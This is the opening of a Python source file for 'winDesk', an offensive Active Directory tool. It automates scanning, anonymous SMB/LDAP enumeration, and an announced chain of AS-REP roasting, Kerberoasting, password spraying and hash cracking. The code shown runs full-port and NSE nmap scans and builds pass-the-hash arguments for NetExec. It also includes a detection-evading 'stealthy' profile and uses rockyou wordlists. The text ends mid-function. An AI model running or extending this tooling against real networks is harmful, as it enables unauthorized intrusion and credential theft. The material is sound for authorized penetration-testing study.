#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
winDesk v1.0 — Ultimate Windows & Active Directory Enumeration + Credential-Access
               Engine, driven by a transparent Expert-System Planner ("the AI").
===============================================================================

Windows and Active Directory automated enumeration + attack-chaining tool.
Author: Shadi Mulla   |   License: MIT

WHAT IT DOES
------------
winDesk automates the full pre-exploitation workflow of a Windows/AD engagement
and *executes* the credential-access chain that every pentest/exam (OSCP, CRTE,
CRTO, CRTP, CPTS) runs by hand:

  DISCOVER → FINGERPRINT → NULL/ANON ENUM (SMB + LDAP) → DOMAIN IDENTITY →
  USER DISCOVERY (SAMR/RID/LDAP/Kerberos) → ATTACK-SURFACE MAP →
  AS-REP ROAST → KERBEROAST → PASSWORD SPRAY → CRACK → RE-ENUMERATE WITH
  RECOVERED CREDENTIALS → **STOP AT ACCESS**

THE "AI" (transparent expert-system planner — no LLM, no NLP, no network AI)
---------------------------------------------------------------------------
A deterministic planner (rule engine + state machine + forward/backward chaining
+ confidence-weighted action ranking) inspects the live state after every round
and prints *why* it chooses each next action. It back-chains from the GOAL
("obtain valid AD credentials → access") to the facts it still needs, then
forward-executes the highest-confidence ready action, re-planning as new facts
(a domain, usernames, a crackable hash, a sprayed credential) unlock new phases.
This is the category the decision-AI skill prescribes for security CLIs:
Rule-Engine + State-Machine + Expert-System, fully explainable and offline.

CREDENTIAL-COMBINATION INTELLIGENCE
-----------------------------------
Every input is optional and ANY combination works. The CredentialStrategist
reasons over what you gave it and decides what to do — including the awkward
combinations:
  • -p PASS only (no user)        → spray that one password across every known user
  • -u USER only                  → validated as a target (AS-REP / kerbrute / spray seed)
  • --passlist only               → spray across discovered users
  • --userlist only               → kerbrute user-validation + AS-REP roast (no password)
  • --userlist --passlist         → password spray (lockout-aware)
  • -u USER --passlist            → spray one user across the wordlist
  • -u USER -p PASS  / -u -H HASH → authenticated (or pass-the-hash) enumeration
  • nothing                       → full null/anonymous sweep

SCOPE — STOPS AT ACCESS
-----------------------
winDesk performs enumeration and credential access only. It STOPS the moment a
valid credential is proven (spray hit, or cracked AS-REP/TGS hash). It does NOT
perform post-exploitation: no secretsdump, no DCSync, no lateral movement, no
code execution, no privilege escalation, no persistence. Authorized engagements
only — signed scope / written ROE required.

Tools orchestrated (all optional, auto-detected): nmap + NSE, NetExec (nxc) /
CrackMapExec (cme), Impacket, kerbrute, hashcat / john, Certipy,
bloodhound-python, ldap3 / ldapsearch, dig / nslookup.
"""

from __future__ import annotations

import argparse
import concurrent.futures as _cf
import http.client
import importlib.metadata
import ipaddress
import json
import os
import random
import re
import shutil
import socket
import subprocess
import sys
import textwrap
import threading
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

__version__ = "1.0"

# ----------------------------------------------------------------------------
#  OPTIONAL LIBRARIES (tool degrades gracefully to CLI equivalents without them)
# ----------------------------------------------------------------------------
IMPACKET_LIB = False
LDAP3_LIB = False
try:
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport, samr
    IMPACKET_LIB = True
except Exception:
    pass
try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, ANONYMOUS
    LDAP3_LIB = True
except Exception:
    pass


# ============================================================================
#  NORMALIZED OUTPUT LAYER  (one consistent style for every tool)
# ============================================================================
class C:
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"
    MAGENTA = "\033[95m"; CYAN = "\033[96m"; WHITE = "\033[97m"; GREY = "\033[90m"
    BOLD = "\033[1m"; DIM = "\033[2m"; RESET = "\033[0m"


_NO_COLOUR = False
_SHOW_RAW = False
_PRINT_LOCK = threading.Lock()


def _c(x): return "" if _NO_COLOUR else x


def _emit(s):
    with _PRINT_LOCK:
        print(s, flush=True)


def _t(tag, col, m):
    _emit(f"{_c(col)}{_c(C.BOLD)}[{tag}]{_c(C.RESET)} {m}")


def ok(m):   _t("+",  C.GREEN,   m)
def info(m): _t("*",  C.BLUE,    m)
def warn(m): _t("!",  C.YELLOW,  m)
def fail(m): _t("-",  C.RED,     m)
def crit(m): _t("!!", C.MAGENTA, m)
def plan(m): _t("AI", C.CYAN,    m)
def win(m):  _t("$$", C.GREEN,   m)
def skip(m): _t("~",  C.GREY,    m)


def head(title):
    bar = "═" * 78
    _emit(f"\n{_c(C.CYAN)}{_c(C.BOLD)}{bar}\n  {title}\n{bar}{_c(C.RESET)}")


def subhead(title):
    _emit(f"{_c(C.BOLD)}{_c(C.WHITE)}  ── {title} ──{_c(C.RESET)}")


def tbl(headers, rows, title="", maxw=60):
    rows = [[truncate(str(c), maxw) for c in r] for r in rows]
    w = [len(h) for h in headers]
    for r in rows:
        for i, c in enumerate(r):
            if i < len(w):
                w[i] = max(w[i], len(c))
    lines = []
    if title:
        lines.append(f"{_c(C.BOLD)}{_c(C.WHITE)}  {title}{_c(C.RESET)}")
    lines.append("  " + "  ".join(f"{_c(C.BOLD)}{_c(C.CYAN)}{h:<{w[i]}}{_c(C.RESET)}"
                                  for i, h in enumerate(headers)))
    lines.append("  " + "  ".join(_c(C.GREY) + "─" * w[i] + _c(C.RESET)
                                  for i in range(len(headers))))
    for r in rows:
        lines.append("  " + "  ".join(f"{(r[i] if i < len(r) else ''):<{w[i]}}"
                                      for i in range(len(headers))))
    if not rows:
        lines.append(f"  {_c(C.DIM)}(none){_c(C.RESET)}")
    _emit("\n".join(lines))


def raw(text, limit=1800):
    if _SHOW_RAW and (text or "").strip():
        with _PRINT_LOCK:
            for ln in truncate(text, limit).splitlines():
                print(f"    {_c(C.DIM)}{ln}{_c(C.RESET)}", flush=True)


def banner():
    b = r"""
 __      ___      ___         _
 \ \    / (_)_ _ |   \ ___ __| |__
  \ \/\/ /| | ' \| |) / -_|_-< / /
   \_/\_/ |_|_||_|___/\___/__/_\_\  v%s
""" % __version__
    _emit(f"{_c(C.CYAN)}{_c(C.BOLD)}{b}{_c(C.RESET)}")
    _emit(f"{_c(C.WHITE)}{_c(C.DIM)}"
          f"{'Windows & Active Directory Enumeration + Credential Access — by Shadi Mulla'.center(78)}"
          f"{_c(C.RESET)}")
    _emit(f"{_c(C.DIM)}"
          f"{'expert-system driven · chains AD attacks with recovered creds · authorized only'.center(78)}"
          f"{_c(C.RESET)}\n")


# ============================================================================
#  MITRE ATT&CK / CWE  (enumeration + credential access, up-to-date technique IDs)
# ============================================================================
ATTACK = {
    "host-discovery": ["T1018"], "port-scan": ["T1046"], "os-fingerprint": ["T1082"],
    "smb-fingerprint": ["T1046", "T1082"], "smb-signing": ["T1046", "T1557.001"],
    "smb-shares": ["T1135"], "smb-domain-users": ["T1087.002"],
    "smb-domain-groups": ["T1069.002"], "smb-policy": ["T1201"],
    "null-session": ["T1135", "T1087.002", "T1069.002"],
    "ldap-null": ["T1087.002", "T1069.002", "T1016"], "gpp-cpassword": ["T1552.006"],
    "rpc-endpoints": ["T1046"], "rpc-samr-users": ["T1087.002"],
    "rpc-lsarpc-rid": ["T1087.002"], "ldap-rootdse": ["T1016", "T1082"],
    "ldap-users": ["T1087.002"], "ldap-groups": ["T1069.002"],
    "ldap-computers": ["T1018"], "ldap-trusts": ["T1482"],
    "ldap-delegation": ["T1134.001", "T1558.003"],
    "kerberos-userenum": ["T1087.002", "T1589.002"],
    "asrep": ["T1558.004"], "kerberoast": ["T1558.003"],
    "spray": ["T1110.003"], "bruteforce": ["T1110.001"], "cred-crack": ["T1110.002"],
    "pth": ["T1550.002"], "adcs": ["T1649"], "laps": ["T1555.006"],
    "gmsa": ["T1555"], "maq": ["T1078.002"], "dns-srv": ["T1590.002"],
    "winrm": ["T1021.006"], "rdp": ["T1021.001"], "mssql": ["T1046"],
    "snmp": ["T1046"], "ftp": ["T1046"], "nfs": ["T1135"], "ssh": ["T1021.004"],
    "desc-creds": ["T1552.001"], "bloodhound": ["T1087.002"],
}
CWE = {
    "smb-signing": "CWE-306 Missing Authentication (NTLM relay exposure)",
    "smbv1": "CWE-477 Use of Obsolete Function",
    "null-session": "CWE-306 Missing Authentication for Critical Function",
    "anon-ldap": "CWE-306 Missing Authentication",
    "gpp-cpassword": "CWE-798 Use of Hard-coded Credentials",
    "desc-password": "CWE-522 Insufficiently Protected Credentials",
    "no-lockout": "CWE-307 Improper Restriction of Excessive Authentication Attempts",
    "asrep": "CWE-304 Missing Critical Step in Authentication",
    "kerberoast": "CWE-522 Insufficiently Protected Credentials",
    "weak-pass": "CWE-521 Weak Password Requirements",
}


# ============================================================================
#  HELPERS
# ============================================================================
def now(): return datetime.now(timezone.utc).isoformat()


def clabel(v):
    return ("very_high" if v >= .9 else "high" if v >= .75 else
            "medium" if v >= .5 else "low" if v >= .25 else "weak")


def truncate(s, n=800):
    s = (s or "").strip()
    return s if len(s) <= n else s[:n] + f"…[+{len(s) - n}]"


def norm_target(t):
    t = t.strip()
    return (t.split("://", 1)[1] if "://" in t else t).strip()


def have(t): return shutil.which(t) is not None


def which_any(*ns):
    for n in ns:
        p = shutil.which(n)
        if p:
            return p
    return None


def resolve(t):
    try:
        ipaddress.ip_address(t)
        return t
    except ValueError:
        pass
    try:
        return socket.gethostbyname(t)
    except Exception:
        return None


def is_ip(s):
    try:
        ipaddress.ip_address(s)
        return True
    except ValueError:
        return False


def count_lines(path):
    try:
        with open(path, errors="ignore") as f:
            return sum(1 for ln in f if ln.strip())
    except Exception:
        return 0


# ============================================================================
#  SUBPROCESS RUNNERS  (stdin=DEVNULL → tools can NEVER block on a prompt)
# ============================================================================
def run(cmd, timeout=60, input_data=None):
    try:
        if input_data is not None:
            p = subprocess.run(cmd, timeout=timeout, capture_output=True, text=True,
                               errors="ignore", input=input_data)
        else:
            p = subprocess.run(cmd, timeout=timeout, capture_output=True, text=True,
                               errors="ignore", stdin=subprocess.DEVNULL)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except subprocess.TimeoutExpired:
        return -1, "[timeout]"
    except FileNotFoundError:
        return -2, "[tool-not-installed]"
    except KeyboardInterrupt:
        raise
    except Exception as e:
        return -3, f"[error: {type(e).__name__}: {e}]"


def run_monitored(cmd, timeout, label, notice_at=300, no_timeout_flag="--no-kerbrute-timeout"):
    """Streaming runner with an elapsed-time watcher. timeout=None → no timeout.
    stdin closed so the tool can never hang on an interactive prompt. A one-time
    notice is printed at `notice_at` seconds (default 5 min)."""
    start = time.time()
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                stdin=subprocess.DEVNULL, text=True, errors="ignore")
    except FileNotFoundError:
        return -2, "[tool-not-installed]"
    except Exception as e:
        return -3, f"[error: {e}]"
    stop = threading.Event()

    def watcher():
        noticed = False
        while not stop.wait(60):
            el = int(time.time() - start)
            if el >= notice_at and not noticed:
                warn(f"{label} has been running for {notice_at // 60} minute(s) "
                     f"(disable the timeout with {no_timeout_flag}, or Ctrl-C to skip)")
                noticed = True
            else:
                info(f"{label} running… {el // 60}m{el % 60:02d}s elapsed")

    threading.Thread(target=watcher, daemon=True).start()
    try:
        out, _ = proc.communicate(timeout=timeout)
        return proc.returncode, out or ""
    except subprocess.TimeoutExpired:
        proc.kill()
        try:
            out, _ = proc.communicate(timeout=10)
        except Exception:
            out = ""
        warn(f"{label} hit the {timeout}s timeout and was stopped "
             f"({no_timeout_flag} disables it).")
        return -1, out or ""
    except KeyboardInterrupt:
        proc.kill()
        raise
    finally:
        stop.set()


def safe(fn, *a, **k):
    try:
        return fn(*a, **k)
    except KeyboardInterrupt:
        raise
    except Exception as e:
        fail(f"[{getattr(fn, '__name__', 'phase')}] {type(e).__name__}: {e}")
        return None


# ============================================================================
#  TOOL DISCOVERY
# ============================================================================
_NXC = None
_NXC_HELP: Dict[str, str] = {}


def nxc_bin():
    global _NXC
    if _NXC is None:
        _NXC = which_any("nxc", "netexec", "crackmapexec", "cme") or ""
    return _NXC or None


def _nxc_help(proto):
    nxc = nxc_bin()
    if not nxc:
        return ""
    k = f"{nxc}:{proto}"
    if k not in _NXC_HELP:
        _, t = run([nxc, proto, "--help"], timeout=25)
        _NXC_HELP[k] = t
    return _NXC_HELP[k]


def nxc_supports(proto, opt): return opt in _nxc_help(proto)


def impacket_tool(name):
    """Resolve an impacket example by any of its common on-disk spellings."""
    cands = [f"impacket-{name}", name, f"{name}.py",
             f"impacket-{name.lower()}", name.lower(), f"{name.lower()}.py"]
    for c in cands:
        p = shutil.which(c)
        if p:
            return p
    for base in ("/usr/share/doc/python3-impacket/examples",
                 "/usr/local/share/doc/impacket/examples",
                 "/usr/share/doc/impacket/examples"):
        for nm in (name, name.lower()):
            cand = os.path.join(base, f"{nm}.py")
            if os.path.exists(cand):
                return cand
    return None


# ============================================================================
#  WORDLIST RESOLUTION
# ============================================================================
def resolve_list(arg, kind):
    if arg and os.path.exists(arg):
        return arg
    if arg:
        warn(f"{kind} '{arg}' not found — trying common locations")
    cands = (["./userlist.txt",
              "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
              "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"]
             if kind == "userlist" else
             ["./passwordlist.txt", "/usr/share/wordlists/rockyou.txt",
              "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"])
    for c in cands:
        if os.path.exists(c):
            info(f"Using {kind}: {c}")
            return c
    return None


# ============================================================================
#  PORT MAPS
# ============================================================================
WIN_TCP_PORTS = {
    21: "ftp", 22: "ssh", 25: "smtp", 53: "dns", 80: "http", 88: "kerberos",
    110: "pop3", 111: "rpcbind", 135: "msrpc", 137: "netbios-ns", 139: "netbios-ssn",
    143: "imap", 161: "snmp", 389: "ldap", 443: "https", 445: "smb", 464: "kpasswd",
    465: "smtps", 587: "submission", 593: "rpc-http", 636: "ldaps", 1433: "mssql",
    1521: "oracle", 2049: "nfs", 3268: "gc", 3269: "gc-ssl", 3389: "rdp",
    5357: "wsdapi", 5985: "winrm", 5986: "winrm-tls", 8080: "http-alt",
    8443: "https-alt", 9389: "ad-ws", 47001: "winrm-old",
}
WIN_UDP_PORTS = {53: "dns", 88: "kerberos", 123: "ntp", 137: "netbios-ns",
                 161: "snmp", 389: "ldap", 464: "kpasswd", 500: "isakmp"}


# ============================================================================
#  DATA MODEL
# ============================================================================
@dataclass
class HostRecord:
    ip: str
    target: str = ""
    hostname: Optional[str] = None
    fqdn: Optional[str] = None
    os_family: Optional[str] = None
    os_confidence: float = 0.0
    domain: Optional[str] = None
    forest: Optional[str] = None
    netbios_domain: Optional[str] = None
    role: Optional[str] = None
    role_confidence: float = 0.0
    sid: Optional[str] = None
    ldap_base: Optional[str] = None
    ports: Dict[int, Dict[str, Any]] = field(default_factory=dict)
    auth: Dict[str, Any] = field(default_factory=lambda: {
        "smb_null": None, "smb_guest": None, "ldap_anon": None,
        "null_shares": None, "null_users": None, "null_passpol": None})
    smb: Dict[str, Any] = field(default_factory=dict)
    rpc: Dict[str, Any] = field(default_factory=dict)
    ldap: Dict[str, Any] = field(default_factory=dict)
    winrm: Dict[str, Any] = field(default_factory=dict)
    rdp: Dict[str, Any] = field(default_factory=dict)
    mssql: Dict[str, Any] = field(default_factory=dict)
    adcs: Dict[str, Any] = field(default_factory=dict)
    maq: Optional[int] = None
    gmsa: List[Dict[str, Any]] = field(default_factory=list)
    users: List[Dict[str, Any]] = field(default_factory=list)
    groups: List[Dict[str, Any]] = field(default_factory=list)
    computers: List[Dict[str, Any]] = field(default_factory=list)
    shares: List[Dict[str, Any]] = field(default_factory=list)
    spn_accounts: List[Dict[str, Any]] = field(default_factory=list)
    asrep_accounts: List[Dict[str, Any]] = field(default_factory=list)
    trusts: List[Dict[str, Any]] = field(default_factory=list)
    delegation: List[Dict[str, Any]] = field(default_factory=list)
    laps: List[Dict[str, Any]] = field(default_factory=list)
    hashes: List[Dict[str, Any]] = field(default_factory=list)       # roasted hashes
    credentials: List[Dict[str, Any]] = field(default_factory=list)  # proven creds
    findings: List[Dict[str, Any]] = field(default_factory=list)
    playbook: List[Dict[str, Any]] = field(default_factory=list)
    next_actions: List[str] = field(default_factory=list)
    decisions: List[str] = field(default_factory=list)
    completed: Set[str] = field(default_factory=set)
    access_gained: bool = False

    def user_names(self):
        seen, out = set(), []
        for u in self.users:
            n = (u.get("username") or "").strip()
            if n and not n.endswith("$") and n.lower() not in seen:
                seen.add(n.lower())
                out.append(n)
        return out

    def open_ports(self): return sorted(self.ports)

    def to_json(self):
        d = asdict(self)
        d["completed"] = sorted(self.completed)
        return d


@dataclass
class Inputs:
    """Credential/wordlist material the operator supplied. The CredentialStrategist
    reasons over which of these are present and in which combination."""
    domain: str = ""
    username: str = ""
    password: str = ""
    nthash: str = ""
    userlist: str = ""
    passlist: str = ""
    local_auth: bool = False
    kerberos: bool = False

    @property
    def has_cred(self): return bool(self.username and (self.password or self.nthash))

    @property
    def has_single_user(self): return bool(self.username)

    @property
    def has_single_pass(self): return bool(self.password)

    @property
    def has_userlist(self): return bool(self.userlist)

    @property
    def has_passlist(self): return bool(self.passlist)

    def describe(self):
        bits = []
        if self.domain:
            bits.append(f"domain={self.domain}")
        if self.username:
            bits.append(f"user={self.username}")
        if self.password:
            bits.append("password=***")
        if self.nthash:
            bits.append("nthash=***")
        if self.userlist:
            bits.append(f"userlist={os.path.basename(self.userlist)}")
        if self.passlist:
            bits.append(f"passlist={os.path.basename(self.passlist)}")
        return ", ".join(bits) or "none (anonymous only)"


class Store:
    def __init__(self):
        self.hosts: Dict[str, HostRecord] = {}
        self.queue: List[str] = []
        self.tool_versions: Dict[str, str] = {}
        self.lock = threading.Lock()

    def host(self, ip, target=""):
        with self.lock:
            if ip not in self.hosts:
                self.hosts[ip] = HostRecord(ip=ip, target=target or ip)
            return self.hosts[ip]

    def enqueue(self, target):
        with self.lock:
            ip = resolve(target) or target
            if ip not in self.hosts and target not in self.queue and ip not in self.queue:
                self.queue.append(target)
                info(f"[graph] queued discovered host: {target}")

    def add_finding(self, ip, title, sev, observed, interp="", attack=None, cwe="",
                    conf=0.5, validation="observed", next_step=""):
        with self.lock:
            h = self.hosts.get(ip)
            if not h:
                return
            if any(f["title"] == title for f in h.findings):
                return
            h.findings.append({"title": title, "severity": sev, "observed": observed,
                               "interpretation": interp, "attack": attack or [], "cwe": cwe,
                               "confidence": conf, "confidence_label": clabel(conf),
                               "validation": validation, "next_step": next_step, "ts": now()})

    def add_evidence(self, ip, module, cmd, excerpt, auth="anonymous"):
        with self.lock:
            h = self.hosts.get(ip)
            if not h:
                return
            h.__dict__.setdefault("_evidence", [])
            h.__dict__["_evidence"].append({
                "module": module, "cmd": " ".join(cmd) if isinstance(cmd, list) else cmd,
                "auth": auth, "excerpt": truncate(excerpt, 1800), "ts": now()})


STORE = Store()


def done(h, a): return a in h.completed
def mark(h, a): h.completed.add(a)


def ev(h, module, cmd, txt, auth="anonymous"):
    STORE.add_evidence(h.ip, module, cmd, txt, auth)
    raw(txt)


# ============================================================================
#  PROFILE  (noisy = lab/pentest; stealthy = red-team/production)
# ============================================================================
@dataclass
class Profile:
    name: str; timing: str; scan: str; osscan: bool; vi: str
    max_rate: Optional[str]; scan_delay: Optional[str]; full_tcp: bool
    nse_discovery: bool; rid_brute: bool; concurrency: int
    jitter_range: Tuple[float, float]; randomize: bool; bloodhound: str
    spray_delay: int               # seconds between spray attempts
    min_rate: Optional[str] = None  # stage-1 fast discovery rate (noisy)

    def jitter(self):
        lo, hi = self.jitter_range
        if hi > 0:
            time.sleep(random.uniform(lo, hi))


def build_profile(name, args):
    if name == "stealthy":
        # Expert red-team low-and-slow: SYN scan, slow timing, hard packet-rate
        # cap, inter-probe delay, curated AD ports only (never a loud -p-), no OS
        # scan, minimal probing, safe NSE only, serialized hosts, randomized
        # order, long jitter, DCOnly BloodHound, spray spaced out.
        p = Profile("stealthy", "-T1", "-sS", False, "0", "50", "300ms",
                    False, False, False, 1, (2.5, 6.0), True, "DCOnly",
                    spray_delay=90, min_rate=None)
    else:
        # Noisy = thorough: full 65535-port TCP sweep (only OPEN ports rendered),
        # OS scan, aggressive version probing, fast spray.
        p = Profile("noisy", "-T4", "-sS", True, "7", None, None,
                    True, True, True,
                    max(1, getattr(args, "threads", 3)), (0.0, 0.0), False, "All",
                    spray_delay=0, min_rate=str(getattr(args, "min_rate", 0) or 2000))
    if getattr(args, "os_scan", False):
        p.osscan = True
    if getattr(args, "no_os_scan", False):
        p.osscan = False
    if getattr(args, "full_tcp", False):
        p.full_tcp = True
    if getattr(args, "fast_ports", False):
        p.full_tcp = False
    return p


# ============================================================================
#  AUTH ARG BUILDER  (never produces an interactive prompt)
# ============================================================================
def nxc_auth(username="", password="", nthash="", domain="", local_auth=False,
             kerberos=False):
    if not username:
        return ["-u", "", "-p", ""]
    a = ["-u", username]
    a += (["-H", nthash] if nthash else ["-p", password])
    if domain:
        a += ["-d", domain]
    if local_auth:
        a += ["--local-auth"]
    if kerberos:
        a += ["-k"]
    return a


# ============================================================================
#  PHASE 1 — PORTS + OS
# ============================================================================
def _native_scan(h, ports, prof, full=False):
    pl = list(range(1, 65536)) if full else list(ports)
    if prof.randomize:
        random.shuffle(pl)

    def chk(p):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5 if prof.name == "noisy" else 3.0)
        try:
            return p, s.connect_ex((h.ip, p)) == 0
        except Exception:
            return p, False
        finally:
            s.close()

    workers = (400 if full else 50) if prof.name == "noisy" else 10
    with _cf.ThreadPoolExecutor(max_workers=workers) as ex:
        for p, is_open in ex.map(chk, pl):
            if is_open:
                h.ports.setdefault(p, {"state": "open",
                                       "service": WIN_TCP_PORTS.get(p, ports.get(p, "?"))})


def phase_ports(h, args, prof):
    if done(h, "ports"):
        return
    head(f"Port Discovery & OS Fingerprint · {h.ip} [{prof.name}]")
    if not have("nmap") or args.no_nmap:
        info(f"nmap unavailable/disabled — native TCP connect scan"
             f"{' (all 65535 ports)' if prof.full_tcp else ''}")
        _native_scan(h, WIN_TCP_PORTS, prof, full=prof.full_tcp)
    elif prof.full_tcp:
        # Stage 1: fast SYN sweep of ALL 65535 ports → discover open ports quickly.
        # Stage 2: -sV (-O) + reason ONLY on the discovered open ports.
        sub = ["nmap", "-Pn", "-n", prof.scan, prof.timing, "--open", "-p-"]
        if prof.min_rate:
            sub += ["--min-rate", prof.min_rate]
        if prof.max_rate:
            sub += ["--max-rate", prof.max_rate]
        sub += [h.ip]
        info("stage 1/2 (fast all-port discovery): " + " ".join(sub))
        rc, txt = run(sub, timeout=args.nmap_timeout)
        ev(h, "port-scan", sub, txt)
        _parse_nmap(h, txt)
        openp = sorted(h.ports)
        if openp:
            plist = ",".join(str(p) for p in openp)
            deep = ["nmap", "-Pn", "-n", prof.scan, prof.timing, "-sV",
                    "--version-intensity", prof.vi, "--open", "--reason", "-p", plist]
            if prof.osscan:
                deep += ["-O", "--osscan-guess"]
            deep += [h.ip]
            info(f"stage 2/2 (service/OS on {len(openp)} open port(s)): " + " ".join(deep))
            rc, txt = run(deep, timeout=args.nmap_timeout)
            ev(h, "port-scan", deep, txt)
            _parse_nmap(h, txt)
        if any(p in h.ports for p in (88, 389, 3268, 53)) and not args.no_udp:
            _udp(h, args, prof)
    else:
        cmd = ["nmap", "-Pn", "-n", prof.scan, prof.timing, "-sV", "--version-intensity",
               prof.vi, "--open", "--reason"]
        if prof.osscan:
            cmd += ["-O", "--osscan-guess"]
        if prof.max_rate:
            cmd += ["--max-rate", prof.max_rate]
        if prof.scan_delay:
            cmd += ["--scan-delay", prof.scan_delay]
        cmd += ["-p", ",".join(map(str, WIN_TCP_PORTS))] + [h.ip]
        info(" ".join(cmd))
        rc, txt = run(cmd, timeout=args.nmap_timeout)
        ev(h, "port-scan", cmd, txt)
        _parse_nmap(h, txt)
        if any(p in h.ports for p in (88, 389, 3268, 53)) and not args.no_udp:
            _udp(h, args, prof)
    _render_ports(h)
    mark(h, "ports")


def _parse_nmap(h, txt):
    for ln in txt.splitlines():
        m = re.match(r"^(\d+)/tcp\s+(open\S*)\s+(\S+)?\s*(.*)$", ln)
        if m and m.group(2).startswith("open"):
            p = int(m.group(1))
            h.ports[p] = {"state": "open", "service": m.group(3) or WIN_TCP_PORTS.get(p, "?"),
                          "version": (m.group(4) or "").strip()}
        for pat in (r"OS details:\s+(.+)", r"Aggressive OS guesses:\s+([^,]+)",
                    r"Running:\s+(.+)"):
            mm = re.search(pat, ln)
            if mm and not h.os_family:
                h.os_family = mm.group(1).strip()


def _udp(h, args, prof):
    cmd = ["nmap", "-Pn", "-n", "-sU", prof.timing, "--open", "-p",
           ",".join(map(str, WIN_UDP_PORTS))]
    if prof.max_rate:
        cmd += ["--max-rate", prof.max_rate]
    cmd += [h.ip]
    rc, txt = run(cmd, timeout=min(args.nmap_timeout, 240))
    ev(h, "port-scan", cmd, txt)
    for ln in txt.splitlines():
        m = re.match(r"^(\d+)/udp\s+(open\S*)\s+(\S+)?", ln)
        if m and "open" in m.group(2):
            pn = int(m.group(1))
            svc = (m.group(3) or "").strip() or WIN_UDP_PORTS.get(pn, "?")
            h.ports.setdefault(pn, {"state": m.group(2), "service": svc, "proto": "udp"})


def _render_ports(h):
    tcp = [p for p in sorted(h.ports) if h.ports[p].get("proto", "tcp") == "tcp"]
    udp = [p for p in sorted(h.ports) if h.ports[p].get("proto") == "udp"]
    tbl(["PORT", "SERVICE", "VERSION"],
        [[f"{p}/tcp", h.ports[p].get("service", ""), h.ports[p].get("version", "")]
         for p in tcp], title=f"Open TCP ports ({len(tcp)})")
    if udp:
        tbl(["PORT", "SERVICE", "VERSION"],
            [[f"{p}/udp", h.ports[p].get("service", ""), h.ports[p].get("version", "")]
             for p in udp], title=f"Open UDP ports ({len(udp)})")


# ============================================================================
#  PHASE 2 — NSE  (safe/discovery; parsed values always rendered in full)
# ============================================================================
def _nse(h, ports, scripts, args, prof, module, sargs="", timeout=None):
    if not have("nmap") or args.no_nmap:
        return ""
    cmd = ["nmap", "-Pn", "-n", prof.scan, prof.timing, "-p", ports,
           "--script", ",".join(scripts)]
    if prof.scan_delay:
        cmd += ["--scan-delay", prof.scan_delay]
    if prof.max_rate:
        cmd += ["--max-rate", prof.max_rate]
    if sargs:
        cmd += ["--script-args", sargs]
    cmd += [h.ip]
    rc, txt = run(cmd, timeout=timeout or args.nmap_timeout)
    ev(h, module, cmd, txt)
    return txt


def phase_nse(h, args, prof, inp):
    if done(h, "nse") or args.no_nse:
        return
    head(f"Nmap NSE Protocol Enumeration · {h.ip}")

    if 445 in h.ports or 139 in h.ports:
        subhead("SMB")
        s = ["smb-os-discovery", "smb-protocols", "smb-security-mode",
             "smb2-security-mode", "smb2-time"]
        if prof.nse_discovery:
            s += ["smb-enum-shares", "smb-enum-sessions", "smb-enum-domains",
                  "smb-enum-users", "smb-mbenum"]
        t = _nse(h, "139,445", s, args, prof, "smb-fingerprint")
        _parse_nse_smb(h, t)
        tbl(["SMB FIELD", "VALUE"],
            [["Operating system", h.os_family or "-"],
             ["Computer name", h.hostname or "-"],
             ["Domain", h.domain or "-"],
             ["Forest", h.forest or "-"],
             ["FQDN", h.fqdn or "-"],
             ["SMB signing", {True: "required", False: "NOT required",
                              None: "unknown"}[h.smb.get("signing")]],
             ["SMBv1", "ENABLED" if h.smb.get("smbv1") else "not offered"],
             ["Dialects", ", ".join(h.smb.get("dialects", [])) or "-"],
             ["Server time", h.smb.get("time", "-")]],
            title="SMB (nmap NSE)")

    if any(p in h.ports for p in (389, 636, 3268, 3269)):
        subhead("LDAP RootDSE")
        t = _nse(h, "389", ["ldap-rootdse"], args, prof, "ldap-rootdse", timeout=120)
        _parse_nse_ldap(h, t)
        if h.ldap:
            tbl(["ROOTDSE ATTRIBUTE", "VALUE"], [[k, v] for k, v in h.ldap.items()],
                title="LDAP RootDSE (nmap NSE)")
        else:
            info("RootDSE returned no attributes over NSE (deep LDAP runs in Phase 5)")

    if 135 in h.ports:
        subhead("MSRPC")
        t = _nse(h, "135", ["msrpc-enum"], args, prof, "rpc-endpoints", timeout=120)
        tbl(["MSRPC (NSE)", "RESULT"],
            [["endpoint-mapper", "reachable" if (t or "").strip() else "no NSE output"]],
            title="MSRPC (nmap NSE) — deep RPC inventory in the Impacket phase")

    if 53 in h.ports:
        subhead("DNS")
        t = _nse(h, "53", ["dns-nsid", "dns-srv-enum"], args, prof, "dns-srv",
                 f"dns-srv-enum.domain={h.domain}" if h.domain else "", timeout=90)
        recs = []
        # dns-srv-enum emits:  "  3268/tcp  dc01.domain.local" grouped under a
        # service heading; capture only well-formed  <port>/<proto>  <fqdn>  rows.
        for m in re.finditer(r"^\s*\|?\s*(\d{1,5})/(tcp|udp)\s+(\S+\.\S+?)\.?\s*$",
                             t or "", re.M):
            host = m.group(3).rstrip(".")
            recs.append([f"{m.group(1)}/{m.group(2)}", host])
            if "." in host and not is_ip(host) and not args.no_graph:
                STORE.enqueue(host)
        mb = re.search(r"bind\.version:\s*(.+)", t or "")
        if mb:
            recs.insert(0, ["bind.version", mb.group(1).strip()])
        mi = re.search(r"id\.server:\s*(.+)", t or "")
        if mi:
            recs.insert(0, ["id.server", mi.group(1).strip()])
        tbl(["DNS SRV / FIELD", "VALUE"], recs, title="DNS (nmap NSE)")

    # Kerberos username enumeration is handled ONLY by kerbrute — not NSE.

    if 3389 in h.ports:
        subhead("RDP")
        t = _nse(h, "3389", ["rdp-ntlm-info", "rdp-enum-encryption"], args, prof, "rdp",
                 timeout=90)
        h.rdp["nla"] = bool(re.search(r"CredSSP|NLA|Negotiate", t or ""))
        rows = [["NLA / CredSSP", "required" if h.rdp["nla"] else "not required"]]
        for key in ("Target_Name", "NetBIOS_Domain_Name", "DNS_Computer_Name",
                    "Product_Version"):
